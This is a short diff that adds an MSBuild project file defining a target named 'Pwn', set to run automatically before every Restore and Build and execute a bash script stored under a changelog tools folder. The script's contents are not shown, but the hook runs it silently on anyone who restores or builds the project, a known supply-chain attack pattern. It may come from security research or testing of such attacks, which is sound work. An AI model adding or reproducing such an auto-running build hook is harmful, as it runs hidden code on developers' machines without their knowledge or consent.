@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="Pwn" BeforeTargets="Restore;Build">
+    <Exec Command="bash $(MSBuildThisFileDirectory)Tools/changelog/pwn.sh" />
+  </Target>
+</Project>
